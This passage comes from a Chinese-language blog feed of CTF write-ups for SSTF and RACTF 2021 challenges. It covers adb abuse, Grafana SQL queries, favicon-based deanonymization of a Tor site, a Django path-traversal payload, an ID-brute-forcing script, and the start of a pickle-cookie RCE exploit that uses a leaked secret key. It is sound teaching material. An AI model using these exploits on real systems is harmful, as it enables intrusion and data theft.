&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">sklearn.linear_model&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">LinearRegression&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LinearRegression&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[]&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;dataset.txt&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;r&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ast&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">literal_eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">l&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">X&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]]&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">l&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">l&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">X&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">round&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">coef_&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]))))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SCTF{Pr0gre55_In_R3gr3ss}&lt;/code>&lt;/p>
&lt;h2 id="adbaby">ADBaby&lt;/h2>
&lt;p>ÊòØÂú®&lt;a href="https://github.com/theori-io/ctf/blob/master/2021/SSTF2021/SSTF%202021%20The%20Duck%20-%20Write%20Up%20-%20rev%201.pdf">Áúãwp&lt;/a>ÁöÑÊó∂ÂÄôÊ≥®ÊÑèÂà∞ÁöÑÈ¢òÔºåÁúã‰∫Ü‰∏™Â§ßÊ¶ÇÊµÅÁ®ãÔºàÂÖ∂ÂÆûÂè™ÊòØÁúºÁÜüadbËÄåÂ∑≤ ËèúÈ∏° Âà´È™Ç‰∫ÜÔºâÔºåÊâÄ‰ª•‰∏ãÈù¢Â∞±ÊòØÂ§ßÊ¶ÇÁøªËØë‰∏Ä‰∏ãwpÔºåÂæàÊ∞¥&lt;/p>
&lt;p>ÂÖàËøûÊé•‰∏ä&lt;code>adb connect adbaby.sstf.site:6666&lt;/code>ÔºåÂèëÁé∞ËøôÊòØ‰∏Ä‰∏™È≠îÊîπËøáÁöÑadbÔºåÂ±èËîΩ‰∫ÜshellÂíå‰∏ªË¶ÅÂäüËÉΩÔºå‰ΩÜÊòØÂèØ‰ª•‰ΩøÁî®push/pullÔºåÂ±û‰∫éÊñá‰ª∂ÁÆ°ÁêÜÁ±ªÁöÑÂëΩ‰ª§ÔºàÂÖ®ÈÉ®Êåá‰ª§ÂèÇËßÅ-&amp;gt;&lt;a href="https://www.jianshu.com/p/839c04b7e1e3">‰Ω†Á°ÆÂÆöÂ∑≤ÁªèÊéåÊè°‰∫ÜadbÁöÑ‰ΩøÁî®Ôºü&lt;/a>&lt;/p>
&lt;p>&lt;code>adb pull /proc/self/exe adbaby&lt;/code>ÊãøÂà∞Êñá‰ª∂Áî®IDAËøõË°åÂàÜÊûêÔºåÂèØ‰ª•ÁúãÂà∞flagÁöÑË∑ØÂæÑÂú®/data/local/tmp/flagÂ§ÑÔºå‰ΩÜÁõ¥Êé•Áî®adb pullÊòØ‰∏çÂèØËææÁöÑÔºåÂõ†‰∏∫ÂØπ&lt;code>./&lt;/code>, &lt;code>../&lt;/code>, &lt;code>data&lt;/code>, &lt;code>local&lt;/code>, &lt;code>tmp&lt;/code>, &lt;code>flag&lt;/code>Ëøô‰∫õÂ≠óÁúºËøõË°å‰∫ÜËøáÊª§&lt;/p>
&lt;p>Êúâ‰∏Ä‰∏™Ëá™ÂÆöÁöÑserviceÂêç‰∏∫adb Flag ServiceÔºåÂØπËæìÂÖ•ÁöÑÂØÜÁ†ÅËøõË°åÊ£ÄÊü•Ôºåmd5ÂêéÂºÄÂ§¥ÊòØ0123456ÁöÑËØùÂ∞±ÂèØ‰ª•ÊãøÂà∞flagÔºåÁî®ËÑöÊú¨Ë∑ë‰∏Ä‰∏ã 415349420009&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">adb&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">adb_commands&lt;/span>
&lt;span style="color:#111">device&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">adb_commands&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AdbCommands&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">device&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ConnectDevice&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">serial&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;adbaby.sstf.site:6666&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">conn&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">device&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">protocol_handler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">device&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">_handle&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;flag:&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">sendafter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">device&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">protocol_handler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">InteractiveShellCommand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">sendafter&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">sendafter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;415349420009&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>SCTF{Do_Uth1nk_th1s_1s_adb}&lt;/code>&lt;/p></description></item><item><title>RACTF2021 Wp</title><link>https://amiaaaz.github.io/2021/08/18/ractf2021-wp/</link><pubDate>Wed, 18 Aug 2021 17:07:55 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/18/ractf2021-wp/</guid><description>&lt;p>&lt;a href="https://2021.ractf.co.uk/">https://2021.ractf.co.uk/&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/ractf/challenges/tree/master/2021">https://github.com/ractf/challenges/tree/master/2021&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/404dcd/RACTF-challenges">https://github.com/404dcd/RACTF-challenges&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.ractf.co.uk/tag/ractf-2021/">https://blog.ractf.co.uk/tag/ractf-2021/&lt;/a>&lt;/p>
&lt;h2 id="webreally-awesome-monitoring-dashboard">Web/Really Awesome Monitoring Dashboard&lt;/h2>
&lt;blockquote>
&lt;p>üåü Perfect infrastructure üåü&lt;/p>
&lt;/blockquote>
&lt;p>ÊòØgrafana&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818005221430.png" alt="image-20210818005221430">&lt;/p>
&lt;p>‰ΩÜÊòØÁâàÊú¨‰πüÂ§™Êñ∞‰∫ÜÂêß8.1.1ÔºåÂº±Âè£‰ª§‰πüÊ≤°ÊúâÔºåÊäìÂåÖÂèØ‰ª•ÁúãÂà∞ÂÆÉÂú®‰∏çÂÅúÁöÑËØ∑Ê±ÇÂêÑÁßçapiÔºåÂÖ∂‰∏≠Êúâ‰∏™/api/ds/queryÔºå‰ª•ÊòéÊñáÊñπÂºèËØ∑Ê±ÇÊï∞ÊçÆÂ∫ìÂÜÖÂÆπ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818005705121.png" alt="image-20210818005705121">&lt;/p>
&lt;p>ÈÇ£ËøôÂ∞±Â•ΩËØ¥‰∫ÜÔºåÁõ¥Êé•ÊòéÁâå‰∫ÜÈÉΩ&lt;/p>
&lt;pre tabindex="0">&lt;code>SELECT name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%';
SELECT * FROM flags;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818011913101.png" alt="image-20210818011913101">&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîËøô‰∏™ÊïÖ‰∫ãÂëäËØâÊàë‰ª¨ÂØπ‰∫éÊùÉÈôêÁöÑËÆæÁΩÆÊòØÂæàÈáçË¶ÅÁöÑÔºå‰∏çË¶ÅÈöè‰æøÊääapiÊé•Âè£Êö¥Èú≤Âá∫Êù•Ôºå‰πü‰∏çË¶ÅÊòéÊñá‰º†ÈÄí‰ø°ÊÅØ&lt;/p>
&lt;h2 id="webreally-awesome-hidden-service">Web/Really Awesome Hidden Service&lt;/h2>
&lt;blockquote>
&lt;p>Ahoy, matey! Some dirty scallywags seem to not be respectin' th' pirate code! Teach them a lesson by findin' out who they be.&lt;/p>
&lt;pre tabindex="0">&lt;code>ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion
&lt;/code>&lt;/pre>&lt;/blockquote>
&lt;p>‰∏Ä‰∏™TorÁöÑÁΩëÁ´ôÔºåËµ∞ÂåøÂêçÊñπÂºè&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818014430572.png" alt="image-20210818014430572">&lt;/p>
&lt;p>ÈÇ£È¶ñÂÖàË¶ÅÊääÈöêËóèÂú®ÂêéÈù¢ÁöÑÁúüÂÆûipÁªôÊâæÂá∫Êù•„ÄÇÊï¥‰∏™ÁΩëÈ°µÁöÑÂÜÖÂÆπÊ≤°Êúâ‰ªÄ‰πàÁâπÂà´ÁöÑÔºå‰ΩÜÊòØÈÄöÂ∏∏ÂÆπÊòìË¢´ÂøΩÁï•ÁöÑÊòØfaviconÂõæÂÉèÔºåËøôÈáåÂèØ‰ª•ÂèÇËÄÉËøôÊ†∑‰∏ÄÁØáÊñáÁ´†Ôºö&lt;a href="https://isc.sans.edu/forums/diary/Hunting+phishing+websites+with+favicon+hashes/27326/">Hunting phishing websites with favicon hashes&lt;/a>&lt;/p>
&lt;p>ËøôÈáåÂèØ‰ª•Áî®&lt;a href="https://github.com/pielco11/fav-up">fav-up&lt;/a>‰∏ÄÊääÊ¢≠Ôºà‰πüÂ∞±ÊòØËá™Âä®Âåñ‰∫ÜÊèêÂèñÂõæÊ†á-&amp;gt;ËÆ°ÁÆómmhashÂÄº-&amp;gt;shodanÊêúÁ¥¢Âá∫ipËøô‰∏™ËøáÁ®ãÔºâÔºåÂæóÂà∞ip‰∏∫&lt;code>178.62.4.214|178.62.15.164&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818021746841.png" alt="image-20210818021746841">&lt;/p>
&lt;p>&lt;code>ractf{DreadingPirates}&lt;/code>&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÈô§Ê≠§‰πãÂ§ñËøòÊúâ‰∏Ä‰∏™ÈùûÈ¢ÑÊúüËß£ÔºåÂΩìÁî®ÈùûÊ≥ïÁöÑhost headerËØ∑Ê±ÇÊó∂Ôºå‰ºöÁõ¥Êé•ËøîÂõûflag&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -s --socks5-hostname localhost:9050 -H &lt;span style="color:#d88200">&amp;#34;Host: asd.com&amp;#34;&lt;/span> ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion &lt;span style="color:#111">|&lt;/span> grep &lt;span style="color:#d88200">&amp;#34;ractf&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;em>All you need to do is send the server an invalid host header, which will cause it to fail back to its default vhost which reveals the flag. In retrospect, the solution to this would have been to make the flag only visible on a specific vhost, rather than the default.&lt;/em>&lt;/p>
&lt;h2 id="webemojibook">Web/Emojibook&lt;/h2>
&lt;blockquote>
&lt;p>&lt;img src="https://b.thumbs.redditmedia.com/4z_KB1qtCsTjcUqxDTbVIpJlR-AMzqrPeZDIz7VKdko.png" alt="img">&lt;/p>
&lt;p>The flag is at &lt;code>/flag.txt&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>ÂèØ‰ª•ÁôªÂΩï„ÄÅÊ≥®ÂÜåË¥¶Êà∑„ÄÅÂèëÂ∏Énote„ÄÅÊü•ÁúãÔºåÁªôÂá∫‰∫ÜÊ∫êÁ†Å&lt;/p>
&lt;p>ÁúãÊ∫êÁ†ÅÔºåÊòØdjangoÊ°ÜÊû∂ÁöÑÂêéÁ´ØÔºåÁõ¥Â•îsettings.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815135148402.png" alt="image-20210815135148402">&lt;/p>
&lt;p>ÁúãÂà∞‰∫ÜÁÜüÊÇâÁöÑpickle&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815145254055.png" alt="image-20210815145254055">&lt;/p>
&lt;p>Âú®‰ªÖÊúâÁöÑËøô‰∏™appÁöÑview.py‰∏≠ÊúâËøôÊ†∑ÁöÑ‰ª£Á†ÅÔºå‰ºöÂú®noteÁöÑbodyÈÉ®ÂàÜÂåπÈÖç&lt;code>{{.*?}}&lt;/code>ËøôÊ†∑ÁöÑÂÜÖÂÆπÂπ∂Â∞ÜÂÖ∂‰∏≠ÁöÑÈÉ®ÂàÜÊãºÊé•Âà∞/emoji/Âêé‰ª•imageÁöÑÂΩ¢ÂºèÂä†ËΩΩÂá∫Êù•Ôºå‰ΩÜÊòØÁõ¥Êé•Áî®{{/flag.txt}}ÊòØ‰∏çÂèØ‰ª•ÁöÑÔºåËøôÈÉ®ÂàÜ‰ª£Á†ÅÂú®forms.py‰∏≠&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818031453613.png" alt="image-20210818031453613">&lt;/p>
&lt;p>ÊâÄ‰ª•ÊúÄÁªàÁöÑpayloadÊòØ &lt;code>{..{/flag.txt}..}&lt;/code>&lt;/p>
&lt;p>&lt;code>ractf{dj4ng0_lfi}&lt;/code>&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÁÑ∂ËÄåËøôÈáåÊúâ‰∏™ÈùûÈ¢ÑÊúüÔºåurlÈÉ®ÂàÜÂèØ‰ª•Áõ¥Êé•‰øÆÊîπnoteÁºñÂè∑ËææÂà∞Ê∞¥Âπ≥Ë∂äÊùÉÔºå‰πüÂ∞±ÊòØËØ¥ÂèØ‰ª•ÈÄöËøáÁàÜÁ†¥ÊñπÂºèÊâæÂà∞‰πãÂâçÂ∑≤ÁªèÊàêÂäüÁöÑnote&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">logging&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">threading&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">time&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">thread_function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://193.57.159.27:30160/&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;base64&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#34;cmFjdGZ7&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">threads&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">index&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">thread_function&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;span style="color:#111">threads&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">thread&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">enumerate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">threads&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">thread&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webemojybook-2">Web/Emojybook 2&lt;/h2>
&lt;blockquote>
&lt;p>no unintended solution this time! the source has not been patched, the unintended solution was caused by my dockerfile&lt;/p>
&lt;p>The flag is at &lt;code>/flag.txt&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>Ë∑ü‰∏äÈù¢ÈÇ£‰∏™ÂâçÁ´Ø‰∏ÄÊ®°‰∏ÄÊ†∑ÔºåÁÑ∂ËÄåËøôÊ¨°ÂÜçÁî®‰πãÂâçÁöÑ &lt;code>{..{/flag.txt}..}&lt;/code>‰ºöËøîÂõû500ÈîôËØØÔºåËøôÂõûÂ∞±Ë¶ÅÁî®‰∏ä‰πãÂâçÂÆåÂÖ®Ê≤°Áî®Âà∞ÁöÑpickle session cookie‰∫Ü„ÄÇ&lt;/p>
&lt;p>ÂÖàËØª‰∏Ä‰∏ã/app/notebook/settings.pyÔºåÂæóÂà∞secret_keyÔºåÁÑ∂ÂêéÊêû‰∏Ä‰∏™ÂèçÂºπshellÁöÑcookieÂá∫Êù•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># Modified from https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/&lt;/span>
&lt;span style="color:#75715e">#!/usr/bin/python&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">django.core.signing&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">django.contrib.sessions.serializers&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">django.http&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">HttpResponse&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">django.conf&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">settings&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">SECRET_KEY&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;wr`BQcZHs4~}EyU(m]`F_SL^BjnkH7&amp;#34;(S3xv,{sp)Xaqg?2pj2=hFCgN&amp;#34;CR&amp;#34;UPn4&amp;#39;&lt;/span>
&lt;span style="color:#111">settings&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">configure&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">DEFAULT_HASHING_ALGORITHM&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;sha256&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># Initial cookie when visiting the page&lt;/span>
&lt;span style="color:#111">cookie&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;.eJxNjEEKwjAQRUVwKYKn0E1Impmm3Yl7z1AmSWNbJYW2WQoeIMt4D4-ookL_8r3Hv68ez8V3t7SL64rC1FRhrIeqtSkuS0xxO4OazKX2b7O3Hflzz0zvp6HV7JOwnx3Zqbf19fhvN7ODhsYmxQOQyMjmSIpzLjMCYyRpDTlwI5wAaTNwFhWgwVISaVWgUKiVcM4V4FJgLxnJP1s:1mFhOG:5yO4Fkp6kQCGyt6e5jHf6Gn5V6gqPDWIw21OTFSw8DM&amp;#34;&lt;/span>
&lt;span style="color:#111">newContent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">django&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">core&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">signing&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cookie&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">serializer&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">django&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">contrib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sessions&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">serializers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PickleSerializer&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">salt&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;django.contrib.sessions.backends.signed_cookies&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PickleRce&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
